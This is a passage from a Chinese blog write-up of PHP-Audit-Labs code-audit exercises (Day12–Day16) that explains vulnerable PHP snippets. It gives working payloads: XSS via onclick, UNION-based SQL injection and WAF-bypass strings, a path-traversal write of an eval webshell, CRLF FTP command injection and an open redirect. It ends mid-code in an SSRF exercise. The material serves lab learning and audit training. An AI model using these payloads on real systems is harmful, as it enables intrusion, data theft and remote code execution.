+<h2 id="Day12"><a href="#Day12" class="headerlink" title="Day12"></a>Day12</h2><h3 id="htmlentities-处理不全"><a href="#htmlentities-处理不全" class="headerlink" title="htmlentities()处理不全"></a>htmlentities()处理不全</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/13.png" alt><br>这里的代码存在一个xss攻击.<br>输出点在一个a标签。同时输出时经过了一次htmlentities.不过这个函数<code>htmlentities()</code>并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制<br>此处默认值的话是不会转义单引号的。<br>同时前面在变量覆盖时传入的变量只对<code>$value</code> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <code>$value</code> 变量，没针对 <code>$key</code> 变量进行处理</p>
+<p>所以payload是<br><code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code><br>绕过intval的同时执行了a标签的onclik事件,达成xss.</p>
+<h3 id="练习-11"><a href="#练习-11" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>这里首先要达成sql注入,自然比较关心是否能闭合单引号。但是注意到,此处的htmlentities严格转义了单双引号。不能进行闭合。</p>
+<p>但是不用引号闭合的另外的办法就是非常常见的<code>\</code>进行转义。这样password的值就变成可控的注入位置了。</p>
+<p>接下来比较关心的是代码中对username与password关键字的过滤。这里过滤很简单,其他盲注之类的方法当然可以做到。不过这里可以用到一个容易被忘记的小技巧:</p>
+<blockquote>
+<p>php.ini中默认<br>如果以 POST 、 GET 方式传入相同的变量，那么用 REQUEST 获取该变量的值将为 POST 该变量的值</p>
+</blockquote>
+<p>所以post数据会覆盖掉get的数据。我们用post传正常的payload、再用get执行sql语句即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get:username&#x3D;\&amp;password&#x3D;union select 1,flag,3,4 from ctf.users%23</span><br><span class="line"></span><br><span class="line">post: username&#x3D;1&amp;password&#x3D;2</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><h3 id="waf失效进行sql注入"><a href="#waf失效进行sql注入" class="headerlink" title="waf失效进行sql注入"></a>waf失效进行sql注入</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/14.png" alt></p>
+<p>本题显然代码中存在sql语句拼接。但是只有一个addslashes,除非是二次注入否则不能利用。<br>然而代码中却出现了很弱智的检查<code>substr()</code>,其长度被定死为20.那么我们只要卡在这个点使用单引号就能导致转义失效了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;1234567890123456789&#39;&amp;passwd&#x3D;or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p>在某CMS中,对sql语句进行了htmlentites处理。但是同时数据在传入前会进行一次urldecode。我们知道,在waf检测后再进行解码操作无疑是具有危害性的。(比如json_deocde如果在waf检测之后的话,就能用unicode绕过任意字符waf)</p>
+<h3 id="练习-12"><a href="#练习-12" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          $string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'('</span>, <span class="string">')'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>, <span class="string">'（'</span>, <span class="string">'）'</span>), $string);</span><br><span class="line">          <span class="keyword">if</span> (strpos($string, <span class="string">'&amp;amp;#'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">              $string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/'</span>, <span class="string">'&amp;\\1'</span>, $string);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">      $check = preg_match(<span class="string">'/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is'</span>, $str);</span><br><span class="line">      <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"非法字符!"</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第一个waf处理</span></span><br><span class="line">  <span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">      $_REQUEST[$key] = dowith_sql($value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第二个WAF处理</span></span><br><span class="line">  $request_uri = explode(<span class="string">"?"</span>, $_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($request_uri[<span class="number">1</span>])) &#123;</span><br><span class="line">      $rewrite_url = explode(<span class="string">"&amp;"</span>, $request_uri[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> ($rewrite_url <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">          $_value = explode(<span class="string">"="</span>, $value);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>($_value[<span class="number">1</span>])) &#123;</span><br><span class="line">              $_REQUEST[$_value[<span class="number">0</span>]] = dhtmlspecialchars(addslashes($_value[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 业务处理</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">      $user_id = $_REQUEST[<span class="string">'i_d'</span>];</span><br><span class="line">      $sql = <span class="string">"select * from ctf.users where id=$user_id"</span>;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line">      <span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个练习很有营养。用到了几个php的特性<br>1.传入的非法的 <code>$_GET</code> 数组参数名,PHP会将他们替换成下划线<br>2.传入多个相同参数时,php只会接受最后一个(类似js了)<br>3.<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>方式获得的参数，并不会对参数中的某些特殊字符进行替换</p>
+<p>本题代码中,<code>$_REQUEST</code>的数据会经过<code>dowith_sql</code>处理。而之后第二个waf会对<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>进行<code>dhtmlspecialchars()</code>处理.</p>
+<p>那么此处思路如下,使用payload<br><code>i_d=padyload&amp;i.d=123</code><br>经过第一次waf时，php会将参数中的某些特殊符号替换为下划线。因此便得到了两个i_d,其中不含恶意代码的<code>i_d</code>内容通过检查。<br>经过第二次waf时,由于代码是通过 $_SERVER[‘REQUEST_URI’] 取参数.检查的实际上是我们初始传入的payload。这里由于是数值型注入,所以可以直接union得到flag</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">submit&#x3D;&amp;i_d&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.users&amp;i.d&#x3D;123</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><h3 id="变量覆盖-路径穿越"><a href="#变量覆盖-路径穿越" class="headerlink" title="变量覆盖+路径穿越"></a>变量覆盖+路径穿越</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/15.png" alt></p>
+<p>这里的代码在析构函数里有写文件的方法。因此只要id可控就能控制路径。同时看到构造函数里存在变量覆盖，那么利用起来就不难了。<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;&#39;,)%0a&lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p>因为实际上写入的内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#39;id&#39;&#x3D;&gt;&#39;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,</span><br><span class="line">    &#39;lost&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;bought&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;shell&#39;&#x3D;&gt;&#39;\&#39;,)</span><br><span class="line">    &lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;&#39;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>所以需要先闭合,换行后写shell注释即可。</p>
+<p>某CMS中也出现了类似的变量覆盖漏洞。比如需要admin权限,而admin权限是由session数组的值决定的。因此可以直接<code>_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</code>覆盖。<br>当然,前提是当前的php开启了<code>session_start()</code></p>
+<h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><h3 id="PHP-SELF"><a href="#PHP-SELF" class="headerlink" title="PHP_SELF"></a>PHP_SELF</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/16.png" alt></p>
+<p>关于<code>$_SERVER[&#39;PHP&#39;]</code>:<br><code>PHP_SELF</code>指当前的页面绝对地址,它是可以控制的.</p>
+<p>同时代码中调用了一次urldecode,加上浏览器自带的一次解码,就可以通过二次url编码进行关键字绕过<br><code>http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</code><br>此处payload即可达成302跳转</p>
+<p><code>PHP_SELF</code>这个考点之前zer0pts的题目中也有出现过</p>
+<h3 id="练习-13"><a href="#练习-13" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./flag.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$black_list = <span class="string">"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|"</span>;</span><br><span class="line">$black_list .= <span class="string">"=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'user'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'pwd'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"></span><br><span class="line">$query=<span class="string">"select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;"</span>;</span><br><span class="line">$result = $conn-&gt;query($query);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'user'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query(<span class="string">"select pwd from users where user='admin'"</span>);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $admin_pass = $row[<span class="string">'pwd'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($admin_pass)&amp;&amp;($admin_pass === $_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没啥意思…跟之前校赛的套路题一样的。<code>regexp</code>进行注入<code>;%00</code>来注释。</p>
+<h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/17.png" alt></p>
+<p>本题主要是一个<code>$_REQUEST</code>的例子。从题目逻辑上看,首先可以知道是进行了一次ftp的连接,同时用<code>intval</code>来试图处理我们的输入。看似无法绕过。但是实际输出下就会发现有蹊跷: <code>$_REQUEST</code>的内容不受过滤函数影响。所以虽然<code>$_REQUEST</code> 内容是上述三个全局变量的合集,但实际上是不会受影响的。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode&#x3D;1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure>
+<p>1可以达成mode的判断。而后续的数据通过crlf被当做命令执行。删除了文件。</p>
+<p>因此,需要注意<code>$_REQUEST</code>的使用。假如只对<code>GET,POST,COOKIE</code>三种进行过滤却在代码中拼接<code>REQUEST</code>是不可取的。</p>
+<h3 id="练习-14"><a href="#练习-14" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span> || ip2long(<span class="string">'0.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])&#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! function_exists(<span class="string">'real_ip'</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">        <span class="keyword">if</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) &amp;&amp; preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">                    $ip = $xip;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$rip = real_ip();</span><br><span class="line"><span class="keyword">if</span>($rip === <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span 